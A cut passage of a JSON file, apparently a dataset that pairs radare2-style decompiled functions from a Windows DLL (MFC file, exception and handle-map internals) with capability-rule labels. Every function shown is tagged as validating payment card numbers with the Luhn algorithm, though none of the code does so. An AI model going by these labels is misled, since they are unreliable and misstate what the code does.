= swi(3);\n        (*pcVar2)();\n        return;\n    }\n    ppcVar1[3] = pcVar2;\n    fcn.180033c90(pcVar2 + *(ppcVar1 + 2) * 8, 0, lpCriticalSection[3] - *(ppcVar1 + 2) << 3);\n    *(ppcVar1 + 2) = lpCriticalSection[3];\n    (*_sym.imp.KERNEL32.dll_TlsSetValue)(*lpCriticalSection, ppcVar1);\ncode_r0x000180028c89:\n    if ((ppcVar1[3] != NULL) && (arg2 < *(ppcVar1 + 2))) {\n        *(ppcVar1[3] + arg2 * 8) = arg3;\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 10);\n    return;\n}\n",
        "token_count": 747
    },
    "180028ce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t fcn.180028cec(uint32_t *arg1, code *arg2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    \n    if (arg2 == NULL) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        iVar3 = (*pcVar1)();\n        return iVar3;\n    }\n    if (*arg1 == 0) {\n        if (*0x18006d2e0 == 0) {\n            *0x18006d2e0 = fcn.1800288bc(0x18006d2f0);\n            if (*0x18006d2e0 == 0) {\n                fcn.180012514();\n                pcVar1 = swi(3);\n                iVar3 = (*pcVar1)();\n                return iVar3;\n            }\n        }\n        uVar2 = fcn.18002890c(*0x18006d2e0);\n        *arg1 = uVar2;\n        if (uVar2 == 0) {\n            fcn.180012514();\n            pcVar1 = swi(3);\n            iVar3 = (*pcVar1)();\n            return iVar3;\n        }\n    }\n    iVar3 = fcn.1800286f8(*0x18006d2e0, *arg1);\n    if (iVar3 == 0) {\n        iVar3 = (*arg2)();\n        fcn.180028b3c(*0x18006d2e0, *arg1, iVar3);\n    }\n    return iVar3;\n}\n",
        "token_count": 351
    },
    "180029a2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.180029a24(code **arg1, ulong arg2, ulong arg3, int64_t arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int64_t *piVar3;\n    code **ppcVar4;\n    int64_t iVar5;\n    uint64_t arg3_00;\n    \n    fcn.180012538(arg1);\n    *arg1 = vtable.CFileException.0;\n    piVar3 = fcn.180012330();\n    arg3_00 = 0;\n    if (piVar3 == NULL) {\n        fcn.180001214(0x80004005);\n        pcVar1 = swi(3);\n        ppcVar4 = (*pcVar1)();\n        return ppcVar4;\n    }\n    iVar5 = (**(*piVar3 + 0x18))(piVar3);\n    arg1[3] = iVar5 + 0x18;\n    *(arg1 + 2) = arg2;\n    *(arg1 + 0x14) = arg3;\n    if (arg4 != 0) {\n        uVar2 = fcn.180033b84(arg4);\n        arg3_00 = uVar2;\n    }\n    fcn.180008dfc(arg1 + 3, arg4, arg3_00);\n    return arg1;\n}\n",
        "token_count": 302
    },
    "18002b32": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.18002b32c(code **arg1, ulong arg2, int64_t arg3)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int64_t *piVar3;\n    code **ppcVar4;\n    int64_t iVar5;\n    uint64_t arg3_00;\n    \n    fcn.180012538(arg1);\n    *arg1 = vtable.CArchiveException.0;\n    piVar3 = fcn.180012330();\n    arg3_00 = 0;\n    if (piVar3 == NULL) {\n        fcn.180001214(0x80004005);\n        pcVar1 = swi(3);\n        ppcVar4 = (*pcVar1)();\n        return ppcVar4;\n    }\n    iVar5 = (**(*piVar3 + 0x18))(piVar3);\n    arg1[3] = iVar5 + 0x18;\n    *(arg1 + 2) = arg2;\n    if (arg3 != 0) {\n        uVar2 = fcn.180033b84(arg3);\n        arg3_00 = uVar2;\n    }\n    fcn.180008dfc(arg1 + 3, arg3, arg3_00);\n    return arg1;\n}\n",
        "token_count": 285
    },
    "18002b42": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18002b424(ulong arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    ulong uStackX24;\n    int64_t iStackX32;\n    \n    iStackX32 = fcn.180009660(0x20);\n    uStackX24 = 0;\n    if (iStackX32 != 0) {\n        uStackX24 = fcn.18002b32c(iStackX32, arg1, arg2);\n    }\n    fcn.180036174(&uStackX24, 0x180062b70);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 149
    },
    "18002b50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint64_t fcn.18002b508(int64_t arg1, int64_t arg2, ulong arg3)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint64_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int64_t iVar11;\n    \n    if ((arg3 == 0) || (arg2 == 0)) {\n        uVar6 = 0;\n    }\n    else {\n        if ((*(arg1 + 0x20) & 1) == 0) {\n            fcn.18002b424(4, *(arg1 + 0x18));\n            pcVar2 = swi(3);\n            uVar6 = (*pcVar2)();\n            return uVar6;\n        }\n        piVar1 = arg1 + 0x40;\n        uVar8 = *piVar1 - *(arg1 + 0x38);\n        uVar6 = uVar8;\n        if (arg3 < uVar8) {\n            uVar6 = arg3;\n        }\n        iVar3 = fcn.180034220(arg2, arg3, *(arg1 + 0x38), uVar6);\n        if (iVar3 != 0) {\n            if (iVar3 == 0xc) {\n                fcn.1800124cc();\n                pcVar2 = swi(3);\n                uVar6 = (*pcVar2)();\n                return uVar6;\n            }\n            if ((iVar3 == 0x16) || (iVar3 == 0x22)) {\n                fcn.180012514();\n                pcVar2 = swi(3);\n                uVar6 = (*pcVar2)();\n                return uVar6;\n            }\n            if (iVar3 != 0x50) {\n                fcn.180012514();\n                pcVar2 = swi(3);\n                uVar6 = (*pcVar2)();\n                return uVar6;\n            }\n        }\n        *(arg1 + 0x38) = *(arg1 + 0x38) + uVar6;\n        arg2 = arg2 + uVar6;\n        uVar8 = arg3 - uVar6;\n        if (uVar8 != 0) {\n            iVar9 = uVar8 - uVar8 % *(arg1 + 0x28);\n            iVar7 = 0;\n            iVar3 = iVar9;\n            do {\n                uVar4 = (**(**(arg1 + 0x30) + 0x68))(*(arg1 + 0x30), arg2, iVar3);\n                iVar7 = iVar7 + uVar4;\n                iVar3 = iVar3 - uVar4;\n                arg2 = arg2 + uVar4;\n                if (uVar4 == 0) break;\n            } while (iVar3 != 0);\n            uVar8 = uVar8 - iVar7;\n            if ((uVar8 != 0) && (iVar7 == iVar9)) {\n                if (*(arg1 + 0xc) == 0) {\n                    uVar4 = uVar8;\n                    if ((*(arg1 + 0x10) == 0) && (uVar4 = *(arg1 + 0x28),  *(arg1 + 0x28) < uVar8)) {\n                        uVar4 = uVar8;\n                    }\n                    iVar11 = *(arg1 + 0x48);\n                    uVar10 = 0;\n                    do {\n                        uVar5 = (**(**(arg1 + 0x30) + 0x68))(*(arg1 + 0x30), iVar11, uVar4);\n                        uVar10 = uVar10 + uVar5;\n                        uVar4 = uVar4 - uVar5;\n                        iVar11 = iVar11 + uVar5;\n                        if ((uVar5 == 0) || (uVar4 == 0)) break;\n                    } while (uVar10 < uVar8);\n                    iVar11 = *(arg1 + 0x48);\n                    *piVar1 = uVar10 + iVar11;\n                }\n                else {\n                    (**(**(arg1 + 0x30) + 0xa0))(*(arg1 + 0x30), 0, *(arg1 + 0x28), arg1 + 0x48, piVar1);\n                    iVar11 = *(arg1 + 0x48);\n                }\n                uVar4 = *piVar1 - iVar11;\n                *(arg1 + 0x38) = iVar11;\n                if (uVar8 < uVar4) {\n                    uVar4 = uVar8;\n                }\n                iVar3 = fcn.180034220(arg2, uVar8, iVar11, uVar4);\n                if (iVar3 != 0) {\n                    if (iVar3 == 0xc) {\n                        fcn.1800124cc();\n                        pcVar2 = swi(3);\n                        uVar6 = (*pcVar2)();\n                        return uVar6;\n                    }\n                    if ((iVar3 == 0x16) || (iVar3 == 0x22)) {\n                        fcn.180012514();\n                        pcVar2 = swi(3);\n                        uVar6 = (*pcVar2)();\n                        return uVar6;\n                    }\n                    if (iVar3 != 0x50) {\n                        fcn.180012514();\n                        pcVar2 = swi(3);\n                        uVar6 = (*pcVar2)();\n                        return uVar6;\n                    }\n                }\n                *(arg1 + 0x38) = *(arg1 + 0x38) + uVar4;\n                uVar8 = uVar8 - uVar4;\n            }\n        }\n        uVar6 = arg3 - uVar8;\n    }\n    return uVar6;\n}\n",
        "token_count": 1304
    },
    "18002b6e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18002b6e4(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    \n    if ((*(arg1 + 0x20) & 1) == 0) {\n        piVar1 = arg1 + 0x48;\n        if (*(arg1 + 0xc) == 0) {\n            iVar2 = *piVar1;\n            if (*(arg1 + 0x38) != iVar2) {\n                (**(**(arg1 + 0x30) + 0x70))(*(arg1 + 0x30), iVar2, *(arg1 + 0x38) - iVar2);\n            }\n        }\n        else {\n            if (*(arg1 + 0x38) != *piVar1) {\n                (**(**(arg1 + 0x30) + 0xa0))(*(arg1 + 0x30), 2, *(arg1 + 0x38) - *piVar1, 0, 0);\n            }\n            (**(**(arg1 + 0x30) + 0xa0))(*(arg1 + 0x30), 1, *(arg1 + 0x28), piVar1, arg1 + 0x40);\n        }\n        iVar2 = *piVar1;\n    }\n    else {\n        if (*(arg1 + 0x40) != *(arg1 + 0x38)) {\n            (**(**(arg1 + 0x30) + 0x50))(*(arg1 + 0x30), *(arg1 + 0x38) - *(arg1 + 0x40), 1);\n        }\n        iVar2 = *(arg1 + 0x40);\n    }\n    *(arg1 + 0x38) = iVar2;\n    return;\n}\n",
        "token_count": 403
    },
    "18002b7a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18002b7a4(int64_t arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint64_t arg1_00;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int64_t iVar6;\n    uint32_t uVar7;\n    uint64_t arg4;\n    \n    if ((*(arg1 + 0x20) & 1) == 0) {\n        fcn.18002b424(4, *(arg1 + 0x18));\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    piVar1 = arg1 + 0x40;\n    uVar4 = *piVar1 - *(arg1 + 0x38);\n    arg4 = uVar4;\n    uVar7 = uVar4 + arg2;\n    if (*(arg1 + 0xc) == 0) {\n        arg1_00 = *(arg1 + 0x48);\n        if (arg1_00 < *(arg1 + 0x38)) {\n            if (0 < uVar4) {\n                iVar3 = fcn.180033080(arg1_00, *piVar1 - arg1_00, *(arg1 + 0x38), arg4);\n                if (iVar3 != 0) {\n                    if (iVar3 == 0xc) {\n                        fcn.1800124cc();\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                    if ((iVar3 == 0x16) || (iVar3 == 0x22)) {\n                        fcn.180012514();\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                    if (iVar3 != 0x50) {\n                        fcn.180012514();\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                }\n                arg1_00 = *(arg1 + 0x48);\n                *(arg1 + 0x38) = arg1_00;\n                *piVar1 = arg4 + arg1_00;\n            }\n            if (*(arg1 + 0x10) == 0) {\n                arg2._0_4_ = *(arg1 + 0x28);\n            }\n            arg2._0_4_ = arg2 - uVar4;\n            iVar6 = arg4 + arg1_00;\n            do {\n                uVar4 = (**(**(arg1 + 0x30) + 0x68))(*(arg1 + 0x30), iVar6, arg2);\n                uVar5 = arg4 + uVar4;\n                arg4 = uVar5;\n                arg2._0_4_ = arg2 - uVar4;\n                iVar6 = iVar6 + uVar4;\n                if ((uVar4 == 0) || (arg2 == 0)) break;\n            } while (uVar5 < uVar7);\n            *(arg1 + 0x38) = *(arg1 + 0x48);\n            *piVar1 = arg4 + *(arg1 + 0x48);\n        }\n    }\n    else {\n        if (uVar4 != 0) {\n            (**(**(arg1 + 0x30) + 0x50))();\n        }\n        (**(**(arg1 + 0x30) + 0xa0))(*(arg1 + 0x30), 0, *(arg1 + 0x28), arg1 + 0x48, piVar1);\n        *(arg1 + 0x38) = *(arg1 + 0x48);\n    }\n    if (*piVar1 - *(arg1 + 0x38) < uVar7) {\n        fcn.18002b424(3, 0);\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 888
    },
    "18002ba7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18002ba70(int64_t arg1, int64_t arg2, ulong arg3)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint64_t arg4;\n    \n    if ((arg3 != 0) && (arg2 != 0)) {\n        if ((~*(arg1 + 0x20) & 1) == 0) {\n            fcn.18002b424(2, *(arg1 + 0x18));\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = arg1 + 0x40;\n        uVar4 = *piVar1 - *(arg1 + 0x38);\n        arg4 = uVar4;\n        if (arg3 < uVar4) {\n            arg4 = arg3;\n        }\n        iVar3 = fcn.180034220(*(arg1 + 0x38), *piVar1 - *(arg1 + 0x38), arg2, arg4);\n        if (iVar3 != 0) {\n            if (iVar3 == 0xc) {\n                fcn.1800124cc();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            if ((iVar3 == 0x16) || (iVar3 == 0x22)) {\n                fcn.180012514();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            if (iVar3 != 0x50) {\n                fcn.180012514();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        *(arg1 + 0x38) = *(arg1 + 0x38) + arg4;\n        arg3._0_4_ = arg3 - arg4;\n        if (arg3 != 0) {\n            fcn.18002b6e4(arg1);\n            uVar4 = arg3 - arg3 % *(arg1 + 0x28);\n            (**(**(arg1 + 0x30) + 0x70))(*(arg1 + 0x30), arg2 + arg4, uVar4);\n            arg3._0_4_ = arg3 - uVar4;\n            if (*(arg1 + 0xc) != 0) {\n                (**(**(arg1 + 0x30) + 0xa0))(*(arg1 + 0x30), 1, *(arg1 + 0x28), arg1 + 0x48, piVar1);\n                *(arg1 + 0x38) = *(arg1 + 0x48);\n            }\n            if (*(arg1 + 0x28) <= arg3) {\n                fcn.180012514();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            if (*(arg1 + 0x38) != *(arg1 + 0x48)) {\n                fcn.180012514();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            iVar3 = fcn.180034220(*(arg1 + 0x38), arg3, arg2 + arg4 + uVar4, arg3);\n            if (iVar3 != 0) {\n                if (iVar3 == 0xc) {\n                    fcn.1800124cc();\n                    pcVar2 = swi(3);\n                    (*pcVar2)();\n                    return;\n                }\n                if ((iVar3 == 0x16) || (iVar3 == 0x22)) {\n                    fcn.180012514();\n                    pcVar2 = swi(3);\n                    (*pcVar2)();\n                    return;\n                }\n                if (iVar3 != 0x50) {\n                    fcn.180012514();\n                    pcVar2 = swi(3);\n                    (*pcVar2)();\n                    return;\n                }\n            }\n            *(arg1 + 0x38) = *(arg1 + 0x38) + arg3;\n        }\n    }\n    return;\n}\n",
        "token_count": 921
    },
    "18002bee": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18002bee4(int64_t arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    \n    if ((*(arg1 + 0x30) != 0) && ((*(arg1 + 0x20) & 2) == 0)) {\n        fcn.18002b6e4(arg1);\n        *(arg1 + 0x30) = 0;\n    }\n    fcn.18002b478(arg1);\n    iVar3 = *(arg1 + 0x18);\n    LOCK();\n    piVar1 = iVar3 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(iVar3 + -0x18) + 8))();\n    }\n    return;\n}\n",
        "token_count": 202
    },
    "18002c0e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.18002c0e0(code **arg1, code *arg2, ulong arg3, ulong arg4)\n\n{\n    code **ppcVar1;\n    code *pcVar2;\n    \n    fcn.180029390(arg1);\n    *arg1 = vtable.CMemFile.0;\n    if ((arg2 == NULL) && (arg3 != 0)) {\n        fcn.180012514();\n        pcVar2 = swi(3);\n        ppcVar1 = (*pcVar2)();\n        return ppcVar1;\n    }\n    arg1[4] = arg4;\n    arg1[5] = NULL;\n    arg1[6] = arg3;\n    pcVar2 = NULL;\n    if (arg4 == 0) {\n        pcVar2 = arg3;\n    }\n    arg1[7] = pcVar2;\n    arg1[8] = arg2;\n    *(arg1 + 9) = 0;\n    return arg1;\n}\n",
        "token_count": 220
    },
    "18002c56": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18002c564(code **arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    ulong in_RDX;\n    uchar auStack1128 [56];\n    code **ppcStack1072;\n    ulong uStack1056;\n    ulong uStack64;\n    uint64_t uStack24;\n    \n    uStack24 = 0xfffffffffffffffe;\n    *arg1 = vtable.CMemFile.0;\n    if (arg1[8] != NULL) {\n        uStack64 = 0x18002c590;\n        fcn.18002c3ec(arg1);\n    }\n    arg1[4] = NULL;\n    arg1[5] = NULL;\n    arg1[6] = NULL;\n    arg1[7] = NULL;\n    uStack1056 = 0xfffffffffffffffe;\n    uStack24 = *0x180067ce0 ^ &stack0xfffffffffffffb98;\n    *arg1 = vtable.CFile.0;\n    ppcStack1072 = arg1;\n    if ((arg1[1] != 0xffffffffffffffff) && (*(arg1 + 2) != 0)) {\n        fcn.180029308(arg1, in_RDX);\n    }\n    pcVar3 = arg1[3];\n    LOCK();\n    piVar1 = pcVar3 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(pcVar3 + -0x18) + 8))();\n    }\n    fcn.180032ea0(uStack24 ^ &stack0xfffffffffffffb98);\n    return;\n}\n",
        "token_count": 386
    },
    "18002c64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.18002c644(code **arg1, code *arg2, code *arg3, code *arg4)\n\n{\n    code *pcVar1;\n    code **ppcVar2;\n    code *in_stack_00000028;\n    uint in_stack_00000030;\n    \n    *arg1 = vtable.CHandleMap.0;\n    fcn.180030f5c(arg1 + 1, *(arg2 + 8), 0x40);\n    fcn.18002d2a4(arg1 + 6, 10);\n    fcn.18002d2a4(arg1 + 0xd, 4);\n    if (arg3 == NULL) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        ppcVar2 = (*pcVar1)();\n        return ppcVar2;\n    }\n    if (arg4 == NULL) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        ppcVar2 = (*pcVar1)();\n        return ppcVar2;\n    }\n    fcn.18002d01c(arg1 + 0xd, 7, 0);\n    arg1[0x14] = arg2;\n    arg1[4] = arg3;\n    arg1[5] = arg4;\n    arg1[0x15] = in_stack_00000028;\n    *(arg1 + 0x16) = in_stack_00000030;\n    return arg1;\n}\n",
        "token_count": 333
    },
    "18002c8f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nbool fcn.18002c8f8(ulong arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    int64_t arg1_00;\n    ulong uVar5;\n    uint32_t uVar6;\n    \n    iVar1 = fcn.1800140a8();\n    arg1_00 = 0;\n    if (*(iVar1 + 0x20) != 0) {\n        uVar6 = *(iVar1 + 0x20) - 1;\n        uVar4 = uVar6;\n        *(iVar1 + 0x20) = uVar6;\n        if (uVar6 == 0) {\n            if (arg1 != 0) {\n                if (arg1 != -1) {\n                    iVar2 = fcn.180010ad4();\n                    if ((iVar2 != 0) && (*(iVar2 + 0x78) != NULL)) {\n                        uVar4 = 0;\n                        (**(iVar2 + 0x78))(0);\n                    }\n                }\n                fcn.18002c800(*(iVar1 + 0x40), uVar4);\n                fcn.18002c800(*(iVar1 + 0x38), uVar4);\n                fcn.18002c800(*(iVar1 + 0x30), uVar4);\n                fcn.18002c800(*(iVar1 + 0x28), uVar4);\n                fcn.18002c800(*(iVar1 + 0x48), uVar4);\n            }\n            iVar2 = fcn.180014058();\n            iVar2 = *(iVar2 + 8);\n            iVar3 = fcn.180028768(0x180069c00);\n            if ((iVar3 != 0) && (iVar2 != 0)) {\n                if (*(iVar3 + 0x18) != 0) {\n                    uVar4 = fcn.180036408(*(iVar3 + 0x18));\n                    if (*(iVar2 + 0x128) <= uVar4) goto code_r0x00018002ca17;\n                }\n                if (*(iVar2 + 0x128) != 0) {\n                    if (*(iVar3 + 0x18) != 0) {\n                        arg1_00 = fcn.180036408(*(iVar3 + 0x18));\n                        fcn.18003342c(*(iVar3 + 0x18));\n                    }\n                    iVar2 = fcn.18003346c(*(iVar2 + 0x128));\n                    *(iVar3 + 0x18) = iVar2;\n                    if ((iVar2 == 0) && (arg1_00 != 0)) {\n                        uVar5 = fcn.18003346c(arg1_00);\n                        *(iVar3 + 0x18) = uVar5;\n                    }\n                }\n            }\n        }\n    }\ncode_r0x00018002ca17:\n    return *(iVar1 + 0x20) != 0;\n}\n",
        "token_count": 665
    },
    "18002eef": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong fcn.18002eef4(void)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    \n    iVar2 = fcn.180013824();\n    iVar3 = fcn.180014058();\n    uVar4 = 0;\n    if (*(iVar3 + 0x28) == '\\0') {\n        iVar1 = (*_sym.imp.ole32.dll_OleInitialize)();\n        if (iVar1 < 0) {\n            fcn.18002ee28(0);\n            uVar4 = 0;\n        }\n        else {\n            *(iVar2 + 0x1dc) = 1;\n            iVar2 = fcn.180010ad4();\n            *(iVar2 + 0x78) = 0x18002ee9c;\n            if (*(iVar2 + 0x80) == 0) {\n                iVar3 = fcn.180009660(0x68);\n                if (iVar3 != 0) {\n                    uVar4 = fcn.18003273c(iVar3);\n                }\n                *(iVar2 + 0x80) = uVar4;\n                iVar2 = fcn.180010ad4();\n                fcn.180032268(*(iVar2 + 0x80));\n            }\n            uVar4 = 1;\n        }\n    }\n    else {\n        *(iVar2 + 0x1dc) = 0xffffffff;\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 336
    },
    "18002efa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18002efac(code **arg1)\n\n{\n    *arg1 = vtable.CEnumArray.0;\n    if (arg1[9] != NULL) {\n        fcn.18001d1a0(arg1[9]);\n    }\n    if (*(arg1 + 0xc) != 0) {\n        fcn.1800096a4(arg1[10]);\n    }\n    if (arg1[4] != NULL) {\n        (**(arg1[4] + 0x38))();\n    }\n    arg1[7] = NULL;\n    return;\n}\n",
        "token_count": 130
    },
    "18002f85": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18002f854(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    int64_t arg1_00;\n    ulong uStackX32;\n    \n    arg1_00 = fcn.180009660(0x20);\n    uStackX32 = 0;\n    if (arg1_00 != 0) {\n        uStackX32 = fcn.180029a24(arg1_00, arg1, arg2, arg3);\n    }\n    fcn.180036174(&uStackX32, 0x180062c50);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 155
    },
    "1800308d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.1800308dc(code **arg1, int64_t arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int64_t *piVar3;\n    code **ppcVar4;\n    int64_t iVar5;\n    int16_t in_R9W;\n    \n    fcn.180012538(arg1);\n    *arg1 = vtable.COleDispatchException.0;\n    piVar3 = fcn.180012330();\n    if (piVar3 == NULL) {\n        fcn.180001214(0x80004005);\n        pcVar1 = swi(3);\n        ppcVar4 = (*pcVar1)();\n        return ppcVar4;\n    }\n    iVar5 = (**(*piVar3 + 0x18))();\n    arg1[3] = iVar5 + 0x18;\n    piVar3 = fcn.180012330();\n    if (piVar3 == NULL) {\n        fcn.180001214(0x80004005);\n        pcVar1 = swi(3);\n        ppcVar4 = (*pcVar1)();\n        return ppcVar4;\n    }\n    iVar5 = (**(*piVar3 + 0x18))();\n    arg1[5] = iVar5 + 0x18;\n    piVar3 = fcn.180012330();\n    if (piVar3 == NULL) {\n        fcn.180001214(0x80004005);\n        pcVar1 = swi(3);\n        ppcVar4 = (*pcVar1)();\n        return ppcVar4;\n    }\n    iVar5 = (**(*piVar3 + 0x18))(piVar3);\n    arg1[6] = iVar5 + 0x18;\n    *(arg1 + 4) = -(arg3 != 0) & arg3 + 0x60000U;\n    *(arg1 + 2) = in_R9W;\n    if (arg2 != 0) {\n        uVar2 = fcn.180033b84(arg2);\n        fcn.180008dfc(arg1 + 3, arg2, uVar2);\n    }\n    *(arg1 + 7) = ~-(in_R9W != 0) & 0x8000ffff;\n    return arg1;\n}\n",
        "token_count": 515
    },
    "180030e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
